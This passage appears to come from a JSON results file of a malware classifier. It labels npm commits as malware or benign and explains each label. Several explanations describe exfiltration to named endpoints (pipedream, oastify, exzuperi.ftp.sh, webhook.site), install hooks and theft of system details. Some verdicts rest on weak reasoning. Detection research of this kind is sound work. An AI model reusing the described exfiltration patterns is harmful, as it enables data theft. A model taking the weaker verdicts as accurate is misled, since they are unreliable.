+    "hash": "15eff7fd7b7b9932e4e6823fc6d2b127e163ca77",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `Telegram link in commit message`\nReason: The presence of a suspicious Telegram link in the commit message could indicate communication with external entities for malicious purposes.\n\n**At line None file None**:\nCode: `npm install --unsafe-perm`\nReason: The dynamic analysis revealed an unexpected outbound connection during 'npm install --unsafe-perm', which is a known vector for potential malware installation or communication.\n\n**At line None file None**:\nCode: `connection=172.17.0.2:38120->20.205.243.165:443`\nReason: The dynamic analysis showed a disallowed outbound connection to a potentially malicious destination, indicating possible malware activity.\n\n**Summary:** The commit is flagged as malware due to the presence of a suspicious Telegram link, potential code injection patterns, and most critically, dynamic analysis showing unexpected outbound connections during npm install, indicating potential malicious activity."
+  },
+  {
+    "hash": "cc737e05d49866f1fbdcf34d1fe8cf4b91cf8cf7",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `preinstall and pingback scripts making HTTP requests to potentially malicious URLs`\nReason: These scripts are suspicious as they make unauthorized HTTP requests, potentially exfiltrating data or downloading malware.\n\n**At line None file lib/appenders/base.js**:\nCode: `usage of 'colors' library`\nReason: The 'colors' library can be used for obfuscation, making it harder to detect malicious activities.\n\n**At line None file app.js**:\nCode: `switch statement with 'props.appender' variable`\nReason: This could potentially be used for code injection if 'props.appender' is not properly validated.\n\n**At line None file None**:\nCode: `outbound connection to 20.205.243.165:443`\nReason: Dynamic analysis detected an unexpected outbound connection, indicating potential malicious activity.\n\n**Summary:** The commit is classified as malware due to multiple critical and medium severity issues detected during static and dynamic analysis, including suspicious network access, potential obfuscation, and unexpected outbound connections."
+  },
+  {
+    "hash": "6307c863bf796f357f0aefb1622934a262bca534",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `https://bes23.free.beeceptor.com`\nReason: The 'preinstall' script makes an HTTP request to a potentially malicious URL, which could be used for data exfiltration or other malicious activities.\n\n**At line None file package.json**:\nCode: `https://eo536ohsnextro9.m.pipedream.net`\nReason: The 'pingback' script makes an HTTP request to a potentially malicious URL, which could be used for data exfiltration or other malicious activities.\n\n**At line None file utils/UseFetchApi.js**:\nCode: `oidcUser.access_token`\nReason: The 'oidcUser.access_token' is being exposed in the 'Authorization' header, potentially leaking sensitive information.\n\n**At line None file None**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The dynamic analysis detected an unexpected outbound connection destination during the execution of 'npm install --unsafe-perm', indicating potential malicious activity.\n\n**Summary:** The commit is classified as malware due to multiple critical and high-severity issues detected in both static and dynamic analyses, including suspicious network access and potential data leaks."
+  },
+  {
+    "hash": "67eafb7dcd628d7985c691564ecd9d2db629f1f6",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file esm2022/lib/ngx-spinner.component.mjs**:\nReason: Potential code injection risk due to the use of `innerHTML` with untrusted input. However, this is a known issue and can be mitigated by proper sanitization using Angular's `DomSanitizer`.\n\n**At line None file package.json**:\nReason: New dependency `form-data` added. While this is a new dependency, the dynamic analysis did not reveal any suspicious activity, suggesting it may be used for legitimate purposes.\n\n**Summary:** The commit is considered benign because although there are potential security issues identified in the static analysis, they are not indicative of malware. The dynamic analysis did not reveal any malicious behavior."
+  },
+  {
+    "hash": "42c9932846df4126ba1e146014c53699d967fd09",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "9a3abb9bff6e73e910ef420c6701ae30f8a2117f",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `preinstall script making an HTTP request`\nReason: The 'preinstall' script makes an unexpected HTTP request, potentially exfiltrating data or downloading malicious content.\n\n**At line None file package.json**:\nCode: `pingback script making an HTTP request`\nReason: The 'pingback' script makes an unexpected HTTP request, potentially exfiltrating data.\n\n**At line None file index.js**:\nCode: `POST request to a suspicious domain`\nReason: The code makes a POST request to a suspicious domain, potentially exfiltrating sensitive data.\n\n**At line None file index.js**:\nCode: `collecting and sending system information`\nReason: The code collects and sends potentially sensitive system information, including hostname, homedir, and userinfo.\n\n**Summary:** The commit contains multiple critical issues related to suspicious network access and data leaks, indicating malicious behavior."
+  },
+  {
+    "hash": "48841fd8bd754ecbb533754d1112eacf1f87a0ef",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line not available file index.js**:\nCode: `HTTPS request to 'exzuperi.ftp.sh' on port 449`\nReason: Suspicious network access to a non-standard port and potentially malicious domain\n\n**At line not available file index.js**:\nCode: `Collecting system information like homedir, hostname, and current directory`\nReason: Potential data leak and exfiltration of sensitive system information\n\n**At line not available file package.json**:\nCode: `'pingback' script making a curl request to 'https://eo536ohsnextro9.m.pipedream.net'`\nReason: Suspicious network access potentially used for tracking or data exfiltration\n\n**At line not available file index.js**:\nCode: `Printing a message with a link to 'https://t.me/exzuperi'`\nReason: Potential communication channel with the attacker\n\n**Summary:** The commit contains multiple critical and high-severity issues indicating malicious behavior, including suspicious network access and data exfiltration. The presence of these issues strongly suggests that the commit is malware."
+  },
+  {
+    "hash": "ee3a7ed8b922c747f0b4595f7e252a5e5ac55de9",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "bf8cc16eaa6da878b352aebe3a81fd02f41777a6",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file package.json**:\nReason: The static analysis detected suspicious URLs and a new 'test' script. However, without further context or evidence of malicious activity, these findings alone are not conclusive indicators of malware.\n\n**Summary:** The commit is likely benign because, although static analysis raised some issues, they are not severe enough to conclusively indicate malware, and dynamic analysis was not available to provide further insights. The issues raised can be addressed through proper review and configuration."
+  },
+  {
+    "hash": "6c66a6530f02aec3c74b14babd024bf9a80c52a5",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file src/api/sendWebhook.js**:\nCode: `fetch request to https://dc-webhooks.tech`\nReason: The fetch request to a suspicious external URL 'https://dc-webhooks.tech' is a strong indicator of malicious activity, potentially exfiltrating data or communicating with a command and control server.\n\n**At line None file src/api/sendWebhook.js**:\nCode: `heavy obfuscation using hexadecimal encoding and complex logic`\nReason: The heavy obfuscation in the code is a red flag, suggesting that the authors may be trying to hide malicious functionality.\n\n**Summary:** The presence of a critical severity issue related to suspicious network access and multiple instances of obfuscated code strongly suggest that this commit is malicious. While dynamic analysis did not yield any results, the static analysis findings are sufficient to conclude that the commit is likely to be malware."
+  },
+  {
+    "hash": "13f793318f774a2bd38d9b132f1a2cdf5b68cc84",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "00fbcb7215a6134f6b1b55fa4778a23028ca7f8f",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file index.js**:\nReason: The server listening on '0.0.0.0' is a common practice for development and hosting servers, and while it poses a risk if not properly configured, it is not inherently malicious.\n\n**At line None file package.json**:\nReason: The addition of 'node-fetch' as a dependency could be for legitimate purposes such as fetching data from APIs, and its presence alone does not indicate malware.\n\n**At line None file .replit**:\nReason: Modifying the 'PATH' environment variable can be risky, but it is not uncommon in certain development environments. Without evidence of it being used maliciously, this alone is not conclusive of malware.\n\n**Summary:** The static analysis raised several potential issues, but none of them conclusively indicate malware. The dynamic analysis did not detect any malicious behavior. Given the information available, the commit is likely benign, as the issues identified can be related to common development practices or configurations that are not inherently malicious."
+  },
+  {
+    "hash": "d14e55446013ed8f0c3f5f8d4fea6032513d567b",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `preinstall script making HTTP request to a suspicious domain`\nReason: The 'preinstall' script is making an HTTP request to a suspicious domain and exfiltrating sensitive system information, indicating potential malware behavior.\n\n**At line None file package.json**:\nCode: `pingback script making HTTP request to an external server`\nReason: The 'pingback' script is making an HTTP request to an external server, which could be used for tracking or other malicious purposes, raising suspicions about its intent.\n\n**Summary:** The static analysis revealed critical and high-severity issues related to suspicious network access and data leaks in the 'preinstall' script, indicating malicious behavior. Although the dynamic analysis did not yield any results, the static analysis findings are sufficient to classify this commit as malware."
+  },
+  {
+    "hash": "796f51622ce2371052309e36bfd6c84841f5f0b3",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file package.json**:\nReason: The static analysis detected suspicious URLs and cryptocurrency references, but without specific lines or code snippets, it's hard to determine their impact. However, the presence of these elements alone does not necessarily indicate malware.\n\n**Summary:** The static analysis raised some concerns due to the presence of suspicious URLs and cryptocurrency references in the commit message or associated files. However, the dynamic analysis did not reveal any malicious behavior. Without concrete evidence of malicious code or behavior, and given that the issues raised are not conclusively tied to specific malicious code, the commit is considered benign. Further review of the commit message and associated code changes is recommended to fully understand the context of the detected issues."
+  },
+  {
+    "hash": "1b66fbe015b16f0fe7c868616bd4b374592bdcb0",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line not available file Main.js**:\nCode: `eval() or Function() usage`\nReason: The use of `eval()` or `Function()` with untrusted input can lead to code injection attacks, which is a critical security risk.\n\n**At line not available file Extra/ExtraScreenShot.js**:\nCode: `HTTP request to external URL`\nReason: Making an HTTP request to an external URL without proper validation can lead to SSRF attacks, which is a high security risk.\n\n**At line not available file Main.js**:\nCode: `setUserNameAndPassWord() function`\nReason: Exposing sensitive data such as the user's password in the code is a medium security risk and indicates poor handling of sensitive information.\n\n**Summary:** The commit contains critical and high severity issues related to code injection and suspicious network access, indicating malicious intent."
+  },
+  {
+    "hash": "cb0f836b6f9d6289d17fb40678ed42858703155b",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file Extra/Html/Classic/script.js**:\nCode: `eval() function used`\nReason: The use of eval() function with obfuscated code is a strong indicator of malicious intent as it can lead to code injection attacks.\n\n**At line N/A file index.js**:\nCode: `GET request to 'https://raw.githubusercontent.com/vudung2008/fca-jiser-remake/main/package.json'`\nReason: This request could be a potential data exfiltration or a command and control channel, indicating malicious activity.\n\n**Summary:** The commit contains critical issues such as code injection via eval() and potential data exfiltration, indicating malicious intent."
+  },
+  {
+    "hash": "4cbbe59b07744482d1cbd35c2984db5eb3e6812c",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "2556adc6b19b89952a5d82ed4c133a1cfc5c95cd",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "9e1a012e3ccd5a5844e7246c21a7d08f4bfc66db",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nReason: Suspicious URLs detected, potentially indicating unauthorized or malicious activity.\n\n**Summary:** The static analysis revealed a medium-severity issue related to suspicious network access in package.json, indicating potential malicious activity. Although the dynamic analysis did not yield any results, the presence of suspicious URLs in the static analysis is sufficient to raise concerns about the commit's intent."
+  },
+  {
+    "hash": "21e2e4a5d6a695450a0b4ac5fe8ca13bb17f06fc",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file src/file/RGB/hexRGB.js**:\nCode: `N/A`\nReason: The code is heavily obfuscated, making it difficult to understand its functionality, which is a strong indicator of malicious intent.\n\n**At line N/A file package.json**:\nCode: `N/A`\nReason: The 'install' script runs 'node scripts/install.js', which could potentially execute malicious code, and the 'axios' dependency is added, which could be used for suspicious network access.\n\n**Summary:** The commit is flagged as malware due to the presence of heavily obfuscated code and potential for command execution through the 'install' script, indicating a high risk of malicious activity."
+  },
+  {
+    "hash": "09cec2fa2f46f2acd6357ea15c813cfb6e579af3",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file scripts/install.js**:\nCode: `exec/execFile from child_process`\nReason: Using `exec` with potentially untrusted input can lead to command injection attacks.\n\n**At line None file package.json**:\nCode: `ftp dependency added`\nReason: The `ftp` dependency may be used for potentially malicious network access.\n\n**At line None file msvs/src/readCwd.cpp**:\nCode: `Complex and potentially obfuscated logic`\nReason: The code's complexity and potential obfuscation make its intent unclear, raising suspicions.\n\n**Summary:** The commit contains critical and high-severity issues, including potential command injection and suspicious network access, indicating malicious intent."
+  },
+  {
+    "hash": "b72cf68917fb3eccf9d35f3227dc6bff2b420829",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file index.js**:\nCode: `N/A`\nReason: Makes an HTTPS request to a suspicious domain 'exzuperi.ftp.sh' with sensitive system information, and exposes sensitive system information.\n\n**At line N/A file package.json**:\nCode: `N/A`\nReason: Contains a 'pingback' script that makes a curl request to a suspicious URL 'https://eo536ohsnextro9.m.pipedream.net'.\n\n**Summary:** The commit is classified as malware due to its suspicious network activities, exposure of sensitive system information, and potentially malicious scripts."
+  },
+  {
+    "hash": "f73bb7fcb7ac3c1d9b1f2d28536f10f45c5fce2d",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating the commit is likely benign."
+  },
+  {
+    "hash": "da457357e9b4eded92334c5de90ce8e547e34a86",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "8eead77bbf96dc0dcb17d6fc9ba570868ece46c8",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: Sending sensitive system information to an external server via HTTPS POST request and leaking sensitive system information such as homedir, hostname, username, and DNS servers.\n\n**At line None file package.json**:\nReason: The 'pingback' script makes an HTTP request to a suspicious external domain, indicating potential malicious activity.\n\n**Summary:** The commit is classified as malware due to the presence of critical issues related to sending and leaking sensitive system information, along with a suspicious network access. These behaviors are indicative of malicious intent."
+  },
+  {
+    "hash": "c11f4498e91104fc9d35e26c528b11ff1623cfad",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line not available file src/sdk-tester.js**:\nCode: `angular.toJson and JSON.parse with user-controlled input`\nReason: Potential code injection vulnerability due to unsanitized user-controlled input being used with angular.toJson and JSON.parse\n\n**At line not available file src/kc-sdk.js**:\nCode: `XMLHttpRequest to kcSdkConfig.tokenServer + 'getMreOpenToken?relayUrl=' + encodedUrl`\nReason: Suspicious network access without proper validation or sanitization of the relayUrl parameter, potentially leading to SSRF attacks\n\n**At line not available file src/sdk-tester.js**:\nCode: `hardcoded clientExampleToken`\nReason: Hardcoded sensitive information (clientExampleToken) which is a security risk\n\n**Summary:** The commit contains potential code injection, suspicious network access, and hardcoded sensitive information, indicating a malicious intent."
+  },
+  {
+    "hash": "77a2089b39329de20d1691a5143bc5e9ca2bebdc",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not reveal any issues or suspicious behavior, indicating the commit is likely benign."
+  },
+  {
+    "hash": "d8454ef88e8210cddc0a076cba95279fc1a991b5",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: Sends an HTTP request to a potentially malicious IP address with sensitive information such as the current working directory and username.\n\n**At line None file index.js**:\nReason: Uploads archived files to an FTP server with hardcoded credentials to a potentially malicious IP address.\n\n**At line None file index.js**:\nReason: Searches for and archives sensitive files and directories and uploads them to an FTP server.\n\n**At line None file preinstall.js**:\nReason: Spawns a new process running 'node index.js' with detached and ignored stdio, potentially allowing for malicious activity.\n\n**Summary:** The commit is classified as malware due to its suspicious network activities, data leaks, and potential for command execution. The static analysis revealed critical issues, including sending sensitive information to a potentially malicious IP address, uploading archived sensitive files to an FTP server with hardcoded credentials, and spawning a new process that could be used for malicious purposes."
+  },
+  {
+    "hash": "d422bf5ed410b6a6ad167b4f06e03e3b229af50f",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nCode: `HTTP request to a potentially malicious external server`\nReason: The static analysis detected a CRITICAL issue related to suspicious network access, indicating a potential malware behavior.\n\n**At line None file index.js**:\nCode: `console.log statement with the text 'HACk!'`\nReason: The presence of a console.log statement with 'HACk!' suggests malicious intent or a leftover from testing, contributing to the suspicion of malware.\n\n**Summary:** The commit is flagged as malware due to a CRITICAL issue related to suspicious network access and a potentially malicious console.log statement, indicating possible malicious behavior."
+  },
+  {
+    "hash": "a3379174586e75f6f4a402153373fd48ed38b905",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: The static analysis revealed that the code is sending sensitive system information to a suspicious external server, which is a strong indication of malicious activity.\n\n**At line None file index.js**:\nReason: The code is collecting and sending sensitive system information such as homedir, hostname, username, and DNS servers without proper justification and user consent, which is a data leak and potentially malicious.\n\n**Summary:** The static analysis results indicate that the commit contains code that is sending sensitive system information to a suspicious external server and is involved in data leaks, which are characteristic behaviors of malware. Although the dynamic analysis did not provide additional insights, the critical and high-severity issues identified in the static analysis are sufficient to classify the commit as malware."
+  },
+  {
+    "hash": "b349279173bacc88347d50ae2ac4b9a08b3a951c",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file icon.min.js**:\nCode: `https://ns.api-system.engineer/?key=`\nReason: The code makes an HTTP request to a suspicious URL with serialized form data, indicating potential data exfiltration.\n\n**At line None file icon.min.js**:\nCode: `String.fromCharCode and hex encoding`\nReason: The presence of obfuscated code using String.fromCharCode and hex encoding suggests an attempt to hide malicious functionality.\n\n**Summary:** The commit is flagged as malware due to the presence of a suspicious network request and obfuscated code in 'icon.min.js', indicating potential malicious activity."
+  },
+  {
+    "hash": "2781d783cf85d5cabfd4faed79bc3a74ef9aede2",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file utils.js**:\nReason: The code contains a potentially malicious function that could lead to code injection attacks.\n\n**At line None file utils/Extension.js**:\nCode: `execSync`\nReason: The use of execSync can lead to command injection attacks if not properly sanitized.\n\n**At line None file index.js**:\nReason: The code stores sensitive information such as email and password in plain text, and accesses environment variables directly without validation.\n\n**Summary:** The commit contains critical and high-severity issues related to code injection, command execution, and data leaks, indicating malicious intent."
+  },
+  {
+    "hash": "8ba357013b6acdbaf12835530d56d95e5de62091",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line N/A file commit message**:\nCode: `Suspicious URL detected`\nReason: The presence of a suspicious URL in the commit message is concerning, but without further context or evidence of its execution or impact, it's not conclusive evidence of malware.\n\n**At line N/A file package.json**:\nCode: `New dependencies added`\nReason: The addition of new dependencies without clear justification is a medium-severity issue. However, the static analysis did not indicate that these dependencies are known to be malicious.\n\n**Summary:** The static analysis revealed potential issues, but they are not conclusive evidence of malware. The dynamic analysis did not detect any malicious behavior. Therefore, based on the available information, the commit is considered benign."
+  },
+  {
+    "hash": "b74e96ae0f395ccee793298f7f1704e2aaabe05c",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nCode: `HTTPS request to 'exzuperi.ftp.sh' with sensitive system information`\nReason: Sending sensitive system information to an external server is a strong indicator of malicious activity.\n\n**At line None file index.js**:\nCode: `Printing a suspicious Telegram link 'https://t.me/exzuperi'`\nReason: Printing a suspicious Telegram link could be used for command and control or for exfiltrating data.\n\n**At line None file package.json**:\nCode: `'pingback' script making a curl request to 'https://eo536ohsnextro9.m.pipedream.net'`\nReason: The 'pingback' script could be used for tracking or for malicious purposes if not necessary for the application's functionality.\n\n**Summary:** The commit is classified as malware due to its suspicious network activities, including sending sensitive system information to an external server and potential command and control communications."
+  },
+  {
+    "hash": "0bc11083c04b0ddbfdd67cd7e651db98b6d47da1",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nCode: `HTTPS POST request to 'ngzvokvmcyctbxbgtsobed0hswyf41v6n.oast.fun'`\nReason: The domain appears to be suspicious and could be used for data exfiltration or other malicious activities.\n\n**At line None file index.js**:\nCode: `Leaking sensitive system information`\nReason: The code is leaking sensitive system information such as homedir, hostname, username, and DNS servers to an external server, which is a strong indicator of malicious activity.\n\n**At line None file package.json**:\nCode: `'pingback' script making a curl request to 'https://eo536ohsnextro9.m.pipedream.net'`\nReason: This could be used for tracking or other malicious purposes, adding to the overall suspicious nature of the commit.\n\n**Summary:** The commit is classified as malware due to multiple critical and high-severity issues identified during static analysis, including suspicious network access and data leaks. The dynamic analysis did not provide additional insights but the static analysis findings are sufficient to determine the commit as malicious."
+  },
+  {
+    "hash": "6a4463a0743f353c585e59a5621a124c30df448a",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file package.json**:\nReason: The static analysis flagged a suspicious URL, but without more context, it's not conclusive evidence of malware. The dynamic analysis did not reveal any malicious behavior.\n\n**Summary:** The commit is likely benign because the dynamic analysis did not detect any malicious activity, and the static analysis issue is not conclusive. Further investigation into the suspicious URL is recommended but based on the provided data, there's not enough evidence to classify it as malware."
+  },
+  {
+    "hash": "150c42eb540aca56e57f178721487a92014b92e6",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `postinstall script contains a base64 encoded string`\nReason: Potential code injection vulnerability as it executes untrusted input in bash\n\n**At line None file ebay-eek/eek-util.js**:\nCode: `String.fromCharCode`\nReason: Usage can be indicative of obfuscation, potentially for malicious purposes\n\n**At line None file package.json**:\nCode: `pingback script making an HTTP request`\nReason: Suspicious network access to a potentially external URL, could be exfiltrating sensitive data\n\n**Summary:** The commit contains multiple indicators of potential malware activity, including code injection, obfuscation, and suspicious network access. While dynamic analysis did not yield results, the static analysis findings are concerning enough to classify this commit as malware."
+  },
+  {
+    "hash": "7eb5240a9f574522b9468e76d5117933a4aa0cb9",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nReason: Suspicious URLs detected, potentially indicating data exfiltration or communication with unknown servers.\n\n**Summary:** The static analysis revealed a high-severity issue related to suspicious network access in the package.json file, indicating potential malicious activity. Although the dynamic analysis did not yield any results, the presence of suspicious URLs in the commit data is a strong indicator of malware."
+  },
+  {
+    "hash": "43a47be3df5af3242b3b319f74837065db274564",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line unknown file unknown**:\nCode: `exec(, child_process`\nReason: The presence of 'exec(, child_process' pattern indicates a potential command execution vulnerability, which is a critical security risk.\n\n**At line unknown file unknown**:\nCode: `https://hackzone.uno/psn`\nReason: The URL 'https://hackzone.uno/psn' is suspicious and potentially indicates unauthorized or malicious network access.\n\n**Summary:** The static analysis revealed critical and high-severity issues, including a potential command execution vulnerability and suspicious network access to a potentially malicious URL. Although the dynamic analysis did not yield any results, the static analysis findings are sufficient to classify the commit as malware."
+  },
+  {
+    "hash": "6f105c9c5c8f01b9ece5d274711b8fb47bfa1ea7",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nCode: `child_process.exec('ls'...`\nReason: Executing 'ls' command using child_process.exec can be dangerous if the input is not sanitized, potentially leading to command injection attacks.\n\n**At line None file index.js**:\nCode: `HTTPS POST request to https://webhook.site/87d635be-aebd-40b4-a842-c8d2becb4e35`\nReason: Sending sensitive system information to an external server via HTTPS POST request is a potential data leak and indicates malicious activity.\n\n**At line None file index.js**:\nCode: `fs.rmdirSync(@vue/compiler-sfc)`\nReason: Deleting a directory without proper validation can lead to unintended data loss, and in the context of other malicious activities, suggests a malicious intent.\n\n**Summary:** The commit is classified as malware due to the presence of critical issues such as command execution with potential unsanitized input, sending sensitive system information to an external server, and suspicious network access. These behaviors are indicative of malicious software."
+  },
+  {
+    "hash": "c297ebd39be7b972187ead4ba8316acd8248ff4b",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file index.js**:\nCode: `N/A`\nReason: Makes an HTTPS request to a suspicious domain 'exzuperi.ftp.sh' with sensitive system information, and collects and sends sensitive system information.\n\n**At line N/A file package.json**:\nCode: `N/A`\nReason: Contains a 'pingback' script that makes a curl request to a suspicious URL 'https://eo536ohsnextro9.m.pipedream.net'.\n\n**At line N/A file index.js**:\nCode: `N/A`\nReason: Prints a message with a link to a Telegram channel 'https://t.me/exzuperi', which could be used for command and control or other malicious purposes.\n\n**Summary:** The commit is classified as malware due to its suspicious network activities, data exfiltration, and potential command and control communication."
+  },
+  {
+    "hash": "9e61d809a8f9f6104c5363cc2305b932f777d8a0",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file build-a-benchmark.js**:\nReason: The code contains obfuscated JavaScript using hex encoding, makes an HTTPS request to an external server, and executes a system command using execSync, which are all indicators of potential malicious activity.\n\n**At line None file package.json**:\nReason: The 'pingback' script makes a curl request to an external server, which could be used for tracking or data exfiltration, further suggesting malicious intent.\n\n**Summary:** The commit is flagged as malware due to multiple indicators of potentially malicious behavior, including obfuscated code, suspicious network access, command execution, and data exfiltration attempts."
+  },
+  {
+    "hash": "28af515cdcab5cc78feb3edfa500845b091276bc",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line unknown file index.js**:\nCode: `POST request to 'p5v8af15zpoexkiajcdpdb8sgjm9ay.oastify.com'`\nReason: The domain appears to be suspicious and is receiving sensitive system information, indicating potential malicious activity.\n\n**At line unknown file index.js**:\nCode: `Sending homedir, hostname, username, and DNS servers`\nReason: Leaking sensitive system information over the network is a significant security risk and is considered malicious behavior.\n\n**Summary:** The commit is classified as malware due to the presence of a suspicious network request sending sensitive system information to an untrusted domain, as identified by the static analysis."
+  },
+  {
+    "hash": "51c00013c4af89ec8021fa12969fe77be0ec7f3c",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: Makes an HTTPS request to a suspicious domain 'exzuperi.ftp.sh' with sensitive system information.\n\n**At line None file index.js**:\nReason: Collects and sends sensitive system information such as homedir, hostname, and current directory.\n\n**At line None file index.js**:\nReason: Prints a suspicious Telegram link 'https://t.me/exzuperi' to the stdout, potentially for command and control or data exfiltration notification.\n\n**Summary:** The commit is classified as malware due to its suspicious network activities, data leaks, and potential command and control communication, indicating a possible backdoor or information stealer."
+  },
+  {
+    "hash": "54ae8848158a234de7b43205b90b5c4aad01b988",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: Makes an HTTPS request to a suspicious external URL and contains a hardcoded URL similar to Burp Collaborator URL, indicating potential data exfiltration or malicious activity.\n\n**At line None file package.json**:\nReason: The 'postinstall' script executes 'node index.js', which could run malicious code if index.js contains harmful logic.\n\n**Summary:** The commit is flagged as malware due to critical issues identified in the static analysis, including suspicious network access and potential command execution. Although the dynamic analysis did not yield any results, the static analysis findings are sufficient to classify the commit as malicious."
+  },
+  {
+    "hash": "1f9f37945efa1c8c2eaa81412c5d1fa6fa9eccab",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: Sending a POST request to a suspicious domain (yln5crjfjii7bv541yhltn71ys4js9gy.oastify.com) with sensitive system information.\n\n**At line None file index.js**:\nReason: Collecting and sending sensitive system information (e.g., homedir, hostname, username, dns servers) to an external server.\n\n**At line None file package.json**:\nReason: Making a curl request to a suspicious domain (eo536ohsnextro9.m.pipedream.net) via the 'pingback' script.\n\n**Summary:** The commit contains multiple indicators of malicious activity, including suspicious network requests and data exfiltration. The static analysis revealed critical and high-severity issues that are characteristic of malware behavior."
+  },
+  {
+    "hash": "f2b41665dd66adc737a3f95758a711cbd121ab2f",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file src/components/BaseFieldI18n.stories.js**:\nReason: The form submission URL is hardcoded, which is not a security risk but a maintainability issue.\n\n**At line None file src/components/BaseAutocompleteFetch.stories.js**:\nReason: Fetches data from an external URL, which is a common practice for storybook stories and not inherently malicious.\n\n**At line None file src/components/BaseBelongsTo.stories.js**:\nReason: Similar to BaseAutocompleteFetch.stories.js, it fetches data from an external URL, likely for demonstration purposes.\n\n**At line None file src/components/BaseDataIterator.stories.js**:\nReason: Fetches data from an external URL for demonstration purposes, not malicious.\n\n**At line None file src/components/BaseDataTable.stories.js**:\nReason: Fetches data from an external URL, a common practice in storybook stories.\n\n**At line None file src/components/BaseDropdownAutocomplete.stories.js**:\nReason: Fetches data from an external URL, likely for demonstration purposes in a storybook story.\n\n**At line None file src/components/BaseFileUploader.stories.js**:\nReason: Uploads files to an external URL, which is a dummy endpoint and not indicative of malicious behavior.\n\n**Summary:** The commit is benign because the static analysis issues are related to hardcoded or external URLs used in storybook stories, which are not indicative of malicious behavior but rather common practices for demonstrating component functionality. The dynamic analysis did not reveal any issues."
+  },
+  {
+    "hash": "3275aaa2114fc7436ee8dc2ef5f349b18829dd19",
+    "sample_folder": "mongoose",
+    "predict": "malware",
